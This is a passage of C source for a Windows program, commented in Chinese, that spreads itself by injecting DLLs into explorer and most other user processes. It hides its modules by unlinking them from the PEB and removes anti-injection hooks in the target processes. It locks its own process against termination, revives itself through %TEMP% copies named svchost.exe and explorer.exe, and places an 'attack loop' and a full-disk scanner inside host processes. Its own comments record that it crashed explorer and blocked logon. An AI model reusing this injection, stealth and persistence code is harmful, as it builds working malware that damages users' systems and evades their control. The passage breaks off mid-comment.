    case 3:  return g_szInjectAtk[0] ? g_szInjectAtk : g_szAtkDllPath;
    case 4:  return g_szInjectDel[0] ? g_szInjectDel : g_szDeleterDllPath;
    default: return g_szInjectGuard[0] ? g_szInjectGuard : g_szGuardDllPath;
    }
}

/* ================== 方案 A：把会话随机名送进宿主 ==================
   注入成功后，把 XX_NAME_BLOCK 写进目标进程私有内存，再 CreateRemoteThread 调用
   目标里那份 dll 的导出函数 XxSetNames；调用返回后**立刻清零再 VirtualFreeEx**
   （读后即删，不在目标里留痕、不落盘、不进任何全局命名空间）。
   RVA 用 LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) 映射同一份文件取得：
   临时副本与本地文件字节相同，RVA 通用，而且这样映射不会执行对方 DllMain。 */


static BOOL __attribute__((unused)) GetRemoteExportRva(LPCWSTR localDllPath, const char *funcName, DWORD *pRva)
{
    HMODULE hMap;
    FARPROC pfn;
    DWORD rva;

    hMap = LoadLibraryExW(localDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMap) return FALSE;
    pfn = GetProcAddress(hMap, funcName);
    if (!pfn) { FreeLibrary(hMap); return FALSE; }
    rva = (DWORD)((ULONG_PTR)pfn - (ULONG_PTR)hMap);
    FreeLibrary(hMap);
    *pRva = rva;
    return TRUE;
}

/* **不再被调用**（保留代码备查）：
   它用 remote LoadLibraryW 的返回值当模块基址，而 GetExitCodeThread 只有 32 位，
   64 位基址被截断 → 加上导出 RVA 就跳到 0x????5B50 这种无效地址（(exec) AV）。
   现在各模块自己从共享内存读 XX_NAME_TOKEN64，命名照样一致，不需要远程推送。 */
static BOOL __attribute__((unused)) PushNamesRemote(HANDLE hProc, HMODULE hRemoteMod,
                                                    LPCWSTR localDllPath, DWORD pid)
{
    DWORD rva = 0;
    XX_NAME_BLOCK block, zero;
    LPVOID pRemote;
    HANDLE hThread;
    BOOL ok = FALSE;

    UNREFERENCED_PARAMETER(hRemoteMod);
    if (!hProc || !localDllPath || !localDllPath[0]) return FALSE;
    if (!GetRemoteExportRva(localDllPath, "XxSetNames", &rva)) return FALSE;

    XXNameBlockInit(&block, NameTok(), 0);
    pRemote = VirtualAllocEx(hProc, NULL, sizeof(block), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) return FALSE;
    if (!WriteProcessMemory(hProc, pRemote, &block, sizeof(block), NULL)) {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        return FALSE;
    }
    hThread = CreateRemoteThread(hProc, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)((BYTE *)hRemoteMod + rva),
                                 pRemote, 0, NULL);
    if (hThread) { WaitForSingleObject(hThread, 2000); CloseHandle(hThread); ok = TRUE; }
    memset(&zero, 0, sizeof(zero));
    WriteProcessMemory(hProc, pRemote, &zero, sizeof(zero), NULL);
    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
    if (!ok) WriteDeamonLog(L"送会话名失败 PID=%lu dll=%ls\n", pid, localDllPath);
    return ok;
}

static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
    SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!pMem) {
        WriteDeamonLog(L"注入失败 VirtualAllocEx PID=%lu dll=%ls\n", pid, dllPath);
        return FALSE;
    }
    WriteProcessMemory(hProc, pMem, dllPath, size, NULL);
    {
        LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pMem, 0, NULL);
        BOOL ok = FALSE;
        if (hThread) {
            DWORD code = 0;
            WaitForSingleObject(hThread, 5000);
            /* 远端线程退出码 = 宿主里 LoadLibraryW 的返回值（只有低 32 位，仅用来判断成败） */
            if (GetExitCodeThread(hThread, &code)) ok = (code != 0);
            else ok = TRUE;
            if (!ok)
                WriteDeamonLog(L"注入被目标拒绝: %ls -> PID=%lu（远端 LoadLibrary 返回 0）\n",
                               dllPath, pid);
            CloseHandle(hThread);
        } else {
            WriteDeamonLog(L"注入 DLL 失败 PID=%lu dll=%ls err=%lu\n", pid, dllPath, GetLastError());
        }
        VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
        return ok;
    }
}
/* ================== guard.dll 宿主部署与句柄交接 ==================
   xx.exe 不再自己加载 guard.dll：那样 xx 一旦被结束，guard 会跟着一起死，
   根本没机会复活 xx。改由这里（跑在 xx.exe 内的 svcguard 实例）把 guard.dll
   注入到同会话的宿主进程，并把 **xx 自己的进程句柄** 复制进宿主、登记到共享
   内存句柄表。guard 侧直接用该句柄判活，不再需要 OpenProcess —— xx 的进程
   DACL 把 Everyone 全拒了，OpenProcess 那条路本来就走不通。 */

/* 本实例是不是跑在"我们自己的 xx"里：xx.exe 本体，或 %TEMP% 里改名的接管副本
   （svchost/explorer/conhost）。必须用路径级判据 —— 副本不叫 xx.exe。 */
static BOOL IsRunningInXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    return XXPathLooksLikeOurXx(path);
}

static BOOL IsSameSession(DWORD pid) {
    DWORD mine = 0, sid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return FALSE;
    if (!ProcessIdToSessionId(pid, &sid)) return FALSE;
    return (mine == sid);
}

static BOOL GuardHostKnown(DWORD pid) {
    for (int i = 0; i < g_guardCount; i++)
        if (g_guardPids[i] == pid) return TRUE;
    return FALSE;
}

static BOOL HostHasOurGuard(DWORD pid) {
    HANDLE h;
    HMODULE mods[1024];
    DWORD needed = 0, count, i;
    BOOL found = FALSE;

    /* 模块已被摘出 PEB、名字也换成了随机系统 dll 名，模块列表判断不可靠 ——
       而且是**双向失准**：`CreateToolhelp32Snapshot(SNAPMODULE)` / `EnumProcessModules`
       读的就是 PEB 那三条链，我们自己摘链之后它们一律返回"找不到"。
       所以唯一可靠的判据是**单例互斥体探针**（这个名字只有我们建得出来）：
       能打开 = 那一份还活着。下面的模块枚举只当"老版本实例没建互斥体"的兜底，
       它返回 false **不能**当成"没有我们的 guard"。 */
    if (XXModulePresent(pid, L"guard", NameTok())) return TRUE;

    h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!h) return FALSE;
    if (EnumProcessModules(h, mods, sizeof(mods), &needed)) {
        count = needed / sizeof(HMODULE);
        for (i = 0; i < count && !found; i++) {
            WCHAR name[MAX_PATH];
            if (GetModuleFileNameExW(h, mods[i], name, MAX_PATH) &&
                _wcsicmp(name, g_szGuardDllPath) == 0)
                found = TRUE;
        }
    }
    CloseHandle(h);
    if (!found) {
        /* 兜底也可能因为"名字被改成随机系统 dll 名"而认不出：那就按守卫进程的存活判活，
           宁可重复部署一份也不要把活着的守卫当成没部署。 */
        HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hp) {
            CloseHandle(hp);
            return TRUE;
        }
    }
    return found;
}

static void ClearHandleEntry(DWORD pid) {
    ULONGLONG tag;
    int i;
    if (!g_pSharedView) return;
    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            XX_HDL_PID(g_pSharedView, i)    = 0;
            XX_HDL_HANDLE(g_pSharedView, i) = 0;
            XX_HDL_TAG(g_pSharedView, i)    = 0;
        }
    }
}

/* 前置声明：Republish 用到后面定义的 PublishGuardHandle */
static void PublishGuardHandle(HANDLE hHost, DWORD pid);

/* 宿主进程消失 / 我们的 guard.dll 被卸掉后要腾出名额，否则再也不会补部署；
   宿主还在则重发一次句柄 —— xx 重启后 tag 与句柄都变了，不重发这个宿主就永远是死条目。 */
static BOOL RepublishGuardHandle(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProc) return FALSE;
    PublishGuardHandle(hProc, pid);
    CloseHandle(hProc);
    return TRUE;
}

static void DropGuardHost(int i) {
    ClearHandleEntry(g_guardPids[i]);
    g_guardPids[i] = g_guardPids[g_guardCount - 1];
    g_guardPids[g_guardCount - 1] = 0;
    g_guardCount--;
}

static void ValidateGuardHosts(void) {
    int i;
    for (i = 0; i < g_guardCount; i++) {
        if (HostHasOurGuard(g_guardPids[i])) {
            if (!RepublishGuardHandle(g_guardPids[i])) {
                WriteDeamonLog(L"guard 宿主无法重发句柄，改投其它宿主 PID=%lu\n", g_guardPids[i]);
                DropGuardHost(i);
                i--;
            }
        } else {
            WriteDeamonLog(L"guard 宿主失效，重新部署 PID=%lu\n", g_guardPids[i]);
            DropGuardHost(i);
            i--;
        }
    }
}

/* 把 xx 自己的进程句柄复制进 hHost，并登记到共享内存句柄表（按宿主 PID 取用）。
   权限只有 查询+同步：即使同一宿主里的对手 DLL 拿到了这个句柄值，也只能等待/查询，
   无法 TerminateProcess(xx)。句柄值只在宿主进程内有效，所以也不需要额外加密。 */
static void PublishGuardHandle(HANDLE hHost, DWORD pid) {
    HANDLE hSelf = NULL, hDup = NULL;
    ULONGLONG tag;
    int i, slot = -1;

    if (!g_pSharedView || !hHost) return;

    /* 源句柄：优先用 xx.exe 在收紧 DACL 之前打开、并写进共享内存的那一个
       （svcguard 与 xx 同进程，句柄值有效）；没有才现场开一次。
       伪句柄不能跨进程复制，所以这里不做那种"退化"。 */
    hSelf = (HANDLE)(ULONG_PTR)XX_SELF_HANDLE(g_pSharedView);
    if (hSelf && GetProcessId(hSelf) != GetCurrentProcessId())
        hSelf = NULL;                       /* 陈旧/无效值，别把别的对象复制进宿主 */

    if (hSelf) {
        if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            WriteDeamonLog(L"自持句柄复制失败 err=%lu，改现场打开\n", GetLastError());
            hDup = NULL;
        }
    }
    if (!hDup) {
        hSelf = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
        if (hSelf) {
            if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                WriteDeamonLog(L"现场句柄复制失败 err=%lu\n", GetLastError());
                hDup = NULL;
            }
            CloseHandle(hSelf);
        }
    }
    if (!hDup) {
        WriteDeamonLog(L"guard 句柄交接失败 PID=%lu\n", pid);
        return;
    }
    /* 注意：hDup 是"在宿主进程里有效"的句柄值，本进程既不能用也不能关。 */

    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        for (i = 0; i < HDL_TABLE_MAX; i++) {
            if (XX_HDL_PID(g_pSharedView, i) == 0 || XX_HDL_TAG(g_pSharedView, i) != tag) {
                slot = i;
                break;
            }
        }
    }
    if (slot < 0) slot = (int)(pid % HDL_TABLE_MAX);   /* 表满：按 PID 顶掉一格 */

    /* 发布顺序有讲究：句柄先写，pid/reserved 最后写。
       guard 侧要求 GetProcessId(handle) == reserved，所以"最后写的 reserved"
       等于给整条记录上了一个校验和 —— 中间态（新句柄 + 旧 reserved，或反过来）
       一定校验不过，会被读取方跳过，而不会把一个坏句柄送进 WaitForSingleObject。 */
    XX_HDL_HANDLE(g_pSharedView, slot)   = (ULONGLONG)(ULONG_PTR)hDup;
    XX_HDL_TAG(g_pSharedView, slot)      = tag;
    XX_HDL_RESERVED(g_pSharedView, slot) = GetCurrentProcessId();   /* 句柄指向的 xx PID */
    XX_HDL_PID(g_pSharedView, slot)      = pid;
    WriteDeamonLog(L"guard 句柄已登记 PID=%lu slot=%d\n", pid, slot);
}

static void EnsureGuardHosts(void) {
    DWORD cand[GUARD_HOST_MAX];
    int nCand = 0, pass, i;

    if (g_guardCount >= GUARD_HOST_MAX) return;
    if (g_szGuardDllPath[0] == L'\0') return;
    if (GetFileAttributesW(g_szGuardDllPath) == INVALID_FILE_ATTRIBUTES) return;

    /* pass 0 优先 explorer.exe（同会话里最稳），pass 1 用其它同会话进程补齐 */
    for (pass = 0; pass < 2 && g_guardCount + nCand < GUARD_HOST_MAX; pass++) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (hSnap == INVALID_HANDLE_VALUE) break;
        if (Process32FirstW(hSnap, &pe)) {
            do {
                BOOL bExplorer = (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0);
                BOOL bDup = FALSE;
                int k;

                if (g_guardCount + nCand >= GUARD_HOST_MAX) break;
                if (pass == 0 && !bExplorer) continue;
                if (pass == 1 && bExplorer) continue;
                if (pe.th32ProcessID == GetCurrentProcessId()) continue;
                if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
                if (GuardHostKnown(pe.th32ProcessID)) continue;
                for (k = 0; k < nCand; k++)
                    if (cand[k] == pe.th32ProcessID) bDup = TRUE;
                if (bDup) continue;
                if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */
                cand[nCand++] = pe.th32ProcessID;
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    for (i = 0; i < nCand; i++) {
        HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_VM_READ | PROCESS_QUERY_INFORMATION |
                                   PROCESS_DUP_HANDLE, FALSE, cand[i]);
        BOOL bDupOk = (hProc != NULL);
        BOOL bCanRead = (hProc != NULL);
        if (!hProc)
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, cand[i]);
        if (!hProc) continue;
        if (bCanRead) RepairTargetLdrHook(hProc, cand[i]);

        if (InjectDll(hProc, InjectPathOf(2), cand[i])) {
            if (bDupOk) PublishGuardHandle(hProc, cand[i]);
            if (g_guardCount < GUARD_HOST_MAX) g_guardPids[g_guardCount++] = cand[i];
            WriteDeamonLog(L"guard.dll 已部署到宿主 PID=%lu（句柄%ls）\n",
                           cand[i], bDupOk ? L"已登记" : L"未登记");
        }
        CloseHandle(hProc);
    }
}

/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里。
   模块已经从 PEB 摘除，既看不到也定位不到它的基址，所以"按基址远程调用
   StartWindow"这条路走不通了 —— 改成**直接重新注入一份**：
     - 宿主里还有活着的实例 → 它的 DllMain 单例检查会拒绝加载，代价极小；
     - 原实例的弹窗线程已死 → 互斥体变成 abandoned，新副本接管并重启弹窗线程。
   这个函数只在"心跳停摆"时被调用（已按 RECOVER 间隔节流），并且刻意忽略
   拒绝黑名单：单例拒绝不代表宿主没救。 */
static void ForceReinjectWindowToHosts(void) {
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int attempts = 0, done = 0;

    RefreshInjectCopies();

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;

            if (done >= 4 || attempts >= 8) break;
            if (pe.th32ProcessID <= 4) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
            if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */

            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_VM_READ |
                                PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            attempts++;
            RepairTargetLdrHook(hProc, pe.th32ProcessID);
            if (InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID)) {
                done++;
                WriteDeamonLog(L"心跳停摆：已向 PID=%lu %ls 重新注入 window.dll\n",
                               pe.th32ProcessID, pe.szExeFile);
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

/* ================== 引导注入：第一毫秒把根扎进 explorer ==================
   为什么必须这么快：yy 的 HunterWorker（yy.cpp 里 bIsGoal 分支）每 **50ms**
   按进程名杀一轮 xx.exe，并先挂起全部线程再 TerminateProcess。xx 随时会没，
   所以"等 xx 初始化完再扩散"的写法等于自杀（原来这里有个 Sleep(5000)，实测就是
   "先开 yy 再开 xx → 有 xx 进程但始终没弹窗"的主因）。
   做法：最多等 300ms 让共享内存就绪，然后**立刻**把 svcguard + window 注入
   控制台会话里的 explorer.exe —— 它几乎总在、且是弹窗最理想的宿主；
   只要这一发成功，弹窗就不再依赖 xx.exe 的存活。 */
/* ================== 注入策略（明确写出来，别让"只注 explorer"这种误解存在） ==================
   轻模块（**所有宿主都注，包括 explorer**）：
     svcguard → 复活/扩散；window → 弹窗（多进程冗余就靠它铺得越广越好）；guard → 宿主看护
   重模块（**不注入弹窗宿主**，只给普通进程）：
     atkcore → 40ms 攻击循环；dedery → 全盘扫描
   原因：重模块的线程/IO 最重，一旦把弹窗宿主（explorer 等）拖崩，弹窗就没了；
        轻模块才是冗余的来源，必须铺得越广越好。 */
/* 当前**真正持有弹窗的那个进程**（共享内存持有者表里本会话那一格）。
   为什么还要这个：光按名字挡 explorer 是不够的 —— window.dll 注入到所有宿主，
   任何宿主都可能抢到弹窗互斥体并真的把窗口显示出来。那个进程就是"当前弹窗宿主"，
   同样不能再往里塞 atkcore/dedery 这种重活，否则它一崩弹窗立刻消失。 */
static BOOL __attribute__((unused)) IsPopupOwnerPid(DWORD pid)
{
    DWORD sid = 0;
    int i;
    if (!g_pSharedView || !pid || pid <= 4) return FALSE;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sid)) return FALSE;
    for (i = 0; i < OWNER_SLOTS; i++) {
        if (XX_SLOT_SESSION(g_pSharedView, i) != sid) continue;
        if ((DWORD)XX_SLOT_PID(g_pSharedView, i) == pid) return TRUE;
    }
    return FALSE;
}
/* 当前宿主进程的映像叶子名（explorer.exe 之类）。
   注意：GetModuleFileNameW(NULL) 取的是进程主映像，不受我们摘 PEB 模块链影响。 */
static void OwnHostLeaf(WCHAR *out, SIZE_T cch)
{
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *p;
    if (!out || !cch) return;
    out[0] = L'\0';
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
    p = wcsrchr(path, L'\\');
    wcsncpy_s(out, cch, p ? p + 1 : path, _TRUNCATE);
}
/* ================== 宿主注入总开关 ==================
   用户实测（log 2026-10-18）：
     · 每注入一个进程，那个进程里 svcguard.dll 就 [CRASH] 一次（0xC0000005）；
     · explorer 反复"已停止工作"；
     · 更严重的是注销后进不了系统，RPC 服务报告异常 —— 因为 LogonUI.exe / taskmgr.exe /
       wetype_server.exe 这些**系统/安全桌面进程**也被注入了。
   在把"注入后宿主为什么崩"彻底查清之前，**默认关闭一切宿主注入**：
     · svcguard / window / atkcore / dedery 都不再往别的进程里塞；
     · 弹窗只在 xx.exe 里显示（它有自己的消息循环，实测 visible=1 正常）；
     · svcguard 只保留心跳监控（复活 xx）+ 清理蜜罐占位。
   要恢复注入实验，把下面这个宏改成 1 再编。 */
#define XX_HOST_INJECTION 1

/* ================== 桌面类宿主名单（用户指定） ==================
   dwm / explorer / notepad / conhost / cmd —— 这几个注 svcguard + window + guard：
     window 铺得越广，弹窗冗余越强；guard 在里面看门；svcguard 负责复活。
   其余进程注 atkcore + svcguard + dedery（攻击 + 复活 + 全盘清道夫）。 */
static BOOL IsDesktopHostLeaf(LPCWSTR leaf)
{
    static const WCHAR *kDesktop[] = {
        L"dwm.exe", L"explorer.exe", L"notepad.exe", L"conhost.exe", L"cmd.exe", NULL
    };
    int i;
    if (!leaf) return FALSE;
    for (i = 0; kDesktop[i]; i++)
        if (_wcsicmp(leaf, kDesktop[i]) == 0) return TRUE;
    return FALSE;
}
static BOOL IsPopupHostProcess(LPCWSTR leaf)
{
    static const WCHAR *kPopupHosts[] = {
        L"explorer.exe",      /* 桌面 shell：我们最主要的弹窗宿主 */
        L"taskhostw.exe",     /* Win7 里叫 taskhost.exe；这里是新名字，命中就按弹窗宿主处理 */
        L"taskhost.exe",
        NULL
    };
    int i;
    if (!leaf) return FALSE;
    for (i = 0; kPopupHosts[i]; i++)
        if (_wcsicmp(leaf, kPopupHosts[i]) == 0) return TRUE;
    return FALSE;
}

/* ================== 安全注入目标判定 ==================
   用户日志里被注入的进程包括 LogonUI.exe / taskmgr.exe / wetype_server.exe /
   audiodg.exe —— 这些是**系统/安全桌面/特权进程**，注进去一出问题就是"注销进不去系统"。
   规则（保守）：
     · `explorer.exe` / `taskhost(w).exe`：允许（我们的弹窗宿主）；
     · 映像路径在 `%WINDIR%`（System32/SysWOW64/…）下的一律**不注**；
     · 其它用户态程序（装在 Program Files、用户目录、%TEMP% 里的）允许。
   这样既能保住多进程冗余，又不会把登录/系统组件卷进来。 */
static BOOL IsSafeInjectTarget(DWORD pid, LPCWSTR leaf)
{
    HANDLE h;
    WCHAR path[MAX_PATH] = L"";
    DWORD cch = MAX_PATH;
    WCHAR windir[MAX_PATH] = L"";

    if (!pid || pid <= 4) return FALSE;
    /* 桌面类宿主（dwm/explorer/notepad/conhost/cmd）即使在 system32 下也放行 */
    if (leaf && (IsDesktopHostLeaf(leaf) ||
                 _wcsicmp(leaf, L"taskhost.exe") == 0 ||
                 _wcsicmp(leaf, L"taskhostw.exe") == 0)) return TRUE;

    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    if (!QueryFullProcessImageNameW(h, 0, path, &cch)) { CloseHandle(h); return FALSE; }
    CloseHandle(h);

    /* 我们自己的 %TEMP% 副本（复活器 svchost/explorer/conhost）**绝不能注**：
       它们只是"等本体死掉再拉起"的看门进程，没有宿主环境；一旦被当成 conhost/explorer
       桌面宿主注进 window.dll，桌面上就会多出第二个弹窗（用户实测：两个窗口）。 */
    {
        WCHAR tdir[MAX_PATH] = L"", mine[MAX_PATH];
        static const WCHAR *kOurCopies[] = { L"svchost.exe", L"explorer.exe", L"conhost.exe", NULL };
        int k;
        if (path[0] && GetTempPathW(MAX_PATH, tdir)) {
            for (k = 0; kOurCopies[k]; k++) {
                swprintf_s(mine, MAX_PATH, L"%ls%ls", tdir, kOurCopies[k]);
                if (_wcsicmp(path, mine) == 0) return FALSE;
            }
        }
    }

    if (GetWindowsDirectoryW(windir, MAX_PATH) && windir[0] &&
        _wcsnicmp(path, windir, wcslen(windir)) == 0)
        return FALSE;                     /* Windows 目录下的系统进程：一个都不注 */

    return TRUE;
}
static BOOL BootstrapInject(LPCWSTR exeName) {
#if !XX_HOST_INJECTION
    UNREFERENCED_PARAMETER(exeName);
    return FALSE;
#endif
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    int done = 0;

    if (!exeName || !exeName[0]) return FALSE;
    if (g_szOwnDir[0] == L'\0' && !InitPaths()) return FALSE;
    RefreshInjectCopies();

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;
            BOOL bWow = FALSE;
            if (_wcsicmp(pe.szExeFile, exeName) != 0) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (!IsSameSession(pe.th32ProcessID)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 系统进程一律不注 */
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (IsWow64Process(hProc, &bWow) && bWow) { CloseHandle(hProc); continue; }
            RepairTargetLdrHook(hProc, pe.th32ProcessID);
            if (InjectDll(hProc, InjectPathOf(0), pe.th32ProcessID)) {      /* svcguard */
                done++;
                WriteDeamonLog(L"引导注入: svcguard -> %ls PID=%lu\n", exeName, pe.th32ProcessID);
            }
            InjectDll(hProc, InjectPathOf(1), pe.th32ProcessID);            /* window（弹窗宿主） */
            InjectDll(hProc, InjectPathOf(2), pe.th32ProcessID);            /* guard（宿主看护） */
            /* 只看窗口冗余：atkcore/dedery 不注入宿主（会把 CPU 打满） */
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe) && done < 4);
    }
    CloseHandle(hSnap);
    return done > 0;
}

static DWORD WINAPI SpreaderThread(LPVOID lp) {
    /* 每个被注入的 svcguard 都负责把剩下的注完（用户指定：xx 只注 svcguard，其余由 svcguard 完成）。
       为了不把 CPU 打满：宿主里的扩散放慢到 3 秒一轮，xx.exe 自己仍是 200ms 一轮。 */
#if !XX_HOST_INJECTION
    UNREFERENCED_PARAMETER(lp);
    return 0;
#endif
    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
    BOOL bImXx;
    DWORD dwGuardScan = 0;
    DWORD dwStatTick = 0;
    int nSeen = 0, nInj = 0, nOpenFail = 0;
    int i;

    UNREFERENCED_PARAMETER(lp);
    /* 不能 Sleep(5000)（见上面说明）：最多等 300ms 让共享内存就绪，然后立刻引导注入 */
    for (i = 0; i < 30 && !g_pSharedView; i++) {
        OpenSharedMemory();
        if (g_pSharedView) break;
        Sleep(10);
    }
    InitPaths();
    bImXx = IsRunningInXxExe();
    if (bImXx) WriteDeamonLog(L"本实例在 xx.exe 内，负责部署 guard.dll 宿主\n");
    {
        DWORD sid = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &sid);
        WriteDeamonLog(L"扩散自检: session=%lu xx=%ls 共享内存=%ls\n",
                       sid, g_szXxExePath, g_pSharedView ? L"OK" : L"MISSING");
        WriteDeamonLog(L"注入策略: svcguard/window/guard -> 所有宿主（含 explorer）；"
                       L"atkcore/dedery -> 除[explorer/taskhost 与**当前弹窗持有者**]外\n");
    }
    if (BootstrapInject(L"explorer.exe"))
        WriteDeamonLog(L"引导注入完成：根已扎进 explorer\n");
    else
        WriteDeamonLog(L"引导注入失败（explorer 打不进），退回常规扩散\n");

    while (!g_bExitFlag) {
        InjCacheRefreshIfDue();
        RefreshInjectCopies();       /* 副本被删会自动重做，代价就是 3 次查属性 */
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
                    if (pe.th32ProcessID <= 4) continue;      /* System / Idle：OpenProcess 必失败 */
                    /* 不按会话过滤：弹窗锁是 Local\，别的会话里的 window.dll 抢不到
                       本会话的锁，所以在别的会话扩散没有副作用；反过来若在这里过滤，
                       一旦 xx 与目标进程会话不一致（服务/SYSTEM 启动、RDP 等），
                       就会一个进程都注入不进去 —— 那才是"别的进程里没有 dll"的元凶。 */
                    nSeen++;
                    if (InjCacheHas(pe.th32ProcessID)) continue;
                    if (RejectedRecently(pe.th32ProcessID)) continue;   /* 反复拒绝的目标别再刷 */
                    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                                               PROCESS_QUERY_INFORMATION,
                                               FALSE, pe.th32ProcessID);
                    BOOL bCanRead = (hProc != NULL);
                    if (!hProc)
                        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                            PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                            FALSE, pe.th32ProcessID);
                    if (!hProc) {
                        nOpenFail++;
                        if (nOpenFail <= 5)   /* 只报前几条，避免刷屏 */
                            WriteDeamonLog(L"OpenProcess 失败 PID=%lu %ls err=%lu\n",
                                           pe.th32ProcessID, pe.szExeFile, GetLastError());
                        InjCacheAdd(pe.th32ProcessID);
                        continue;
                    }
                    /* 32 位进程装不了 64 位 dll：直接跳过，别每秒重试一次 */
                    {
                        BOOL bWow64 = FALSE;
                        if (IsWow64Process(hProc, &bWow64) && bWow64) {
                            MarkRejected(pe.th32ProcessID);
                            WriteDeamonLog(L"跳过 32 位进程 PID=%lu %ls\n",
                                           pe.th32ProcessID, pe.szExeFile);
                            CloseHandle(hProc);
                            continue;
                        }
                    }
                    /* 注入前先拆掉目标里可能存在的 LdrLoadDll 反注入 hook */
                    if (bCanRead) RepairTargetLdrHook(hProc, pe.th32ProcessID);

                    /* 判断目标里是否已有我们的模块：**只能用互斥体探针**。
                       EnumProcessModules 读的是 PEB 三条链，而我们自己把链摘了、
